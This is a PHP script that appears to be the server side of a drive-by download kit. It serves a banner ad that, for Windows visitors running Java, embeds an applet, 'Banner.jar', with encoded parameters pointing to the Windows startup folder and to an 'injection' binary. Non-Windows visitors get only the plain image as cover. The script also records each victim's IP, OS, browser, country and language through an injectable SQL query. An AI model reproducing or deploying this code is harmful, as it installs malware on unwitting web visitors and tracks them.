<?php 

	require_once ("header.php");

	function doRegisterDownload(){
		$ip = trim(@$_POST["ip"]);
		$os = trim(@$_POST["os"]);
		$browser = trim(@$_POST["browser"]);
		$country = trim(@$_POST["country"]);
		$language = trim(@$_POST["language"]);
		
		if(strlen($ip)>0 && strlen($os)>0 &&
		   strlen($browser)>0 && strlen($country)>0 && strlen($language)>0) {
			header('Content-Type: text/plain');
			$creation = date("Y-n-j" , time());
			$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
			@mysql_select_db(getDB(), $link) or die(mysql_error());
			$query = "INSERT INTO downloads (creation, ip, country, os, browser, language) VALUES ('$creation', '$ip', '$country', '$os', '$browser', '$language')";
			$result = @mysql_query($query, $link) or die(mysql_error());  			
			@mysql_close($link) or die(mysql_error());
			
			echo "REGISTRED OK";			
			exit;
		}
	} doRegisterDownload();

	function rot13( $cad ) {
    	for( $i = 0; $i < strlen( $cad ); $i++ ) {
        	$char = ord( $cad[$i] );
        	if ($char >= ord( 'n' ) & $char <= ord( 'z' ) | 
			    $char >= ord( 'N' ) & $char <= ord( 'Z' ) ) $char -= 13;
        	elseif ($char >= ord( 'a' ) & $char <= ord( 'm' ) | 
				    $char >= ord( 'A' ) & $char <= ord( 'M' ) )	$char += 13;
        	$cad[$i] = chr( $char );
    	}
		return $cad;
	}
	
	function encode($code){
		return @rot13(@base64_encode($code));
	}	
	
	function isHTML(){
		$type = @$_GET["type"];
		if($type == "html") return true;
		return false;
	}
	
	function createHeader(){
		$type = @$_GET["type"];
		if($type == "html") {
			header('Content-Type: text/html');
			return;
		}
		header('Content-Type: text/javascript');
	}
	
	$id = trim(@$_GET["id"]);
	$injections = new Injecions;
	
	if(strlen($id) <= 0 || !checkAplhaNumeric($id)) {
		unset($injections);
		exit;
	}
	else{		
		if(!$injections->existsInjection($id)){
			unset($injections);
			exit;
		}
	}
	
	$array = array();
	$array["diectDownload"] = false;
	
	require_once ("Windows.php");
	
	$win = new Windows;
	$array["isWin"] = $win->isWindowsBased();
	if(!$array["isWin"]) $array["isWin"] = 0;
	$array["containsFile"] = false;
		
	$arrayInjection = $injections->getInjectionInfo($id);
	unset($injections);
	
	$binaryPath = "../injections/".$id."/".$arrayInjection["binary"];
	$bannerPath = "../injections/".$id."/".$arrayInjection["banner"];
		
	if(file_exists($binaryPath) && file_exists($bannerPath)){
		if($array["diectDownload"]) $array["content"] = encode(@file_get_contents($binaryPath));
		else $array["content"] = "";
		
		$array["containsFile"] = true;
		$array["runpath"] = encode($win->getStartUpPath());			
		$array["filename"] = encode(str_replace('.binary', '', $arrayInjection["binary"]));
			
		$dir = str_replace('/doc/', '', getCurrentPath())."/injections/".$id."/";
		$array["bannerpPath"] = encode($dir . $arrayInjection["banner"]);
		$array["binaryPath"] = encode($dir . $arrayInjection["binary"]);
		
		$bannerPath = $dir . $arrayInjection["banner"];
		$bannerPath = str_replace(' ', '%20', $bannerPath);
		
		require_once ("GeoIP.php");
		
		$geo = new GeoIP;
		$array["ip"] = $geo->getIP();//"186.83.211.150";
		$tmp = $geo->getLocation($array["ip"]);
		unset($geo);
		
		$array["country"] = $tmp["country"];
		unset($tmp);
		
	}
	else {
		exit;
	}
	unset($binaryPath);
	
	if($array["isWin"]){
		createHeader();
		$array["os.name"] = $win->getOSVersion();
		$array["language"] = $win->getLanguage();
		$array["browser.name"] = $win->getBrowserName();
	}
	else{
		createHeader();	
		if(!isHTML()){
			echo "document.writeln('<img src=\"".$bannerPath."\" border=\"0\" width=\"".$arrayInjection["width"]."\" height=\"".$arrayInjection["height"]."\" >');\n";
		}
		else{
			echo "<html><body><script type=\"text/javascript\">\n";
			echo "document.writeln('<img src=\"".$bannerPath."\" border=\"0\ width=\"".$arrayInjection["width"]."\" height=\"".$arrayInjection["height"]."\" >');\n";
			echo "</script></body></html>\n";
		}
		exit;
	}
	
	unset($win);

	$urlSelf = getCurrentPath()."js.php";
	if(isHTML()){		
		 echo "<html>\n<head>\n";
		 echo "<style type=\"text/css\">\n";
		 echo "body { \nmargin-left: 0px;\nmargin-top: 0px;\nmargin-right: 0px;\nmargin-bottom: 0px;\n}\n";
		 echo "</style>\n</head>\n<body>\n<script type=\"text/javascript\">\n";
	}
	
	if($array["browser.name"] != "Internet Explorer"){
		echo "function writeApplet() {\n";
		echo "\tdocument.writeln('<applet code=\"Banner.class\" archive=\"".getCurrentPath()."Banner.jar\" width=\"".$arrayInjection["width"]."\" height=\"".$arrayInjection["height"]."\" >');\n";
		
		echo "\tdocument.writeln(createParam(\"country\", \"".$array["country"]."\"));\n"; 
		echo "\tdocument.writeln(createParam(\"ip\", \"".$array["ip"]."\"));\n";
		echo "\tdocument.writeln(createParam(\"self\", \"".encode($urlSelf)."\"));\n";
		echo "\tdocument.writeln(createParam(\"browser\", \"".$array["browser.name"]."\"));\n"; 
		echo "\tdocument.writeln(createParam(\"os\", \"".$array["os.name"]."\"));\n"; 
		echo "\tdocument.writeln(createParam(\"isWin\", \"".$array["isWin"]."\"));\n"; 
		echo "\tdocument.writeln(createParam(\"language\", \"".$array["language"]."\"));\n"; 
		echo "\tdocument.writeln(createParam(\"containsFile\", \"".$array["containsFile"]."\"));\n"; 
		echo "\tdocument.writeln(createParam(\"runpath\", \"".$array["runpath"]."\"));\n";		
		echo "\tdocument.writeln(createParam(\"bannerpPath\", \"".$array["bannerpPath"]."\"));\n";
		echo "\tdocument.writeln(createParam(\"binaryPath\", \"".$array["binaryPath"]."\"));\n";
		echo "\tdocument.writeln(createParam(\"filename\", \"".$array["filename"]."\"));\n"; 
		echo "\tdocument.writeln(createParam(\"content\", \"".$array["content"]."\"));\n"; 
		echo "\tdocument.writeln('</applet>');\n";
		echo "}\n\n";
	}
	else{
		echo "function writeApplet() {\n";
		echo "\tdocument.writeln('<object classid=\"clsid:8AD9C840-044E-11D1-B3E9-00805F499D93\" width=\"".$arrayInjection["width"]."\" height=\"".$arrayInjection["height"]."\" >');\n";
		
		echo "\tdocument.writeln(createParam(\"scriptable\", \"true\"));\n";
		echo "\tdocument.writeln(createParam(\"mayscript\", \"true\"));\n";
		echo "\tdocument.writeln(createParam(\"type\", \"application/x-java-applet\"));\n";
		echo "\tdocument.writeln(createParam(\"code\", \"Banner\"));\n";
		echo "\tdocument.writeln(createParam(\"archive\", \"".getCurrentPath()."Banner.jar\"));\n";
		
		echo "\tdocument.writeln(createParam(\"country\", \"".$array["country"]."\"));\n"; 
		echo "\tdocument.writeln(createParam(\"ip\", \"".$array["ip"]."\"));\n";
		echo "\tdocument.writeln(createParam(\"self\", \"".encode($urlSelf)."\"));\n";		
		echo "\tdocument.writeln(createParam(\"browser\", \"".$array["browser.name"]."\"));\n"; 
		echo "\tdocument.writeln(createParam(\"os\", \"".$array["os.name"]."\"));\n"; 
		echo "\tdocument.writeln(createParam(\"isWin\", \"".$array["isWin"]."\"));\n"; 
		echo "\tdocument.writeln(createParam(\"language\", \"".$array["language"]."\"));\n"; 
		echo "\tdocument.writeln(createParam(\"containsFile\", \"".$array["containsFile"]."\"));\n"; 
		echo "\tdocument.writeln(createParam(\"runpath\", \"".$array["runpath"]."\"));\n"; 
		echo "\tdocument.writeln(createParam(\"filename\", \"".$array["filename"]."\"));\n"; 
		echo "\tdocument.writeln(createParam(\"bannerpPath\", \"".$array["bannerpPath"]."\"));\n";
		echo "\tdocument.writeln(createParam(\"binaryPath\", \"".$array["binaryPath"]."\"));\n";
		echo "\tdocument.writeln(createParam(\"content\", \"".$array["content"]."\"));\n"; 
		echo "\tdocument.writeln('</object>');\n";
		echo "}\n\n";
	}
	
	echo "function createParam(name, value) {\n";
	echo "\treturn '<param name=\"' + name + '\" value=\"' + value + '\">';\n";
	echo "}\n\n";
		
	echo "function isJavaEnabled(){\n";
	echo "\treturn navigator.javaEnabled();\n";
	echo "}\n\n";
	
	echo "var haveJava = isJavaEnabled();\n";
	echo "var isWin = ".$array["isWin"].";\n";
	echo "var containsFile = ".$array["containsFile"].";\n";
	echo "if(haveJava && isWin && containsFile) writeApplet();\n";
	echo "else document.writeln('<img src=\"".$bannerPath."\" width=\"".$arrayInjection["width"]."\" height=\"".$arrayInjection["height"]."\" border=\"0\">');\n";
	
	if(isHTML()) echo "</script>\n</body>\n</html>\n";
	
	unset($array);
	unset($arrayInjection);
	exit;

?>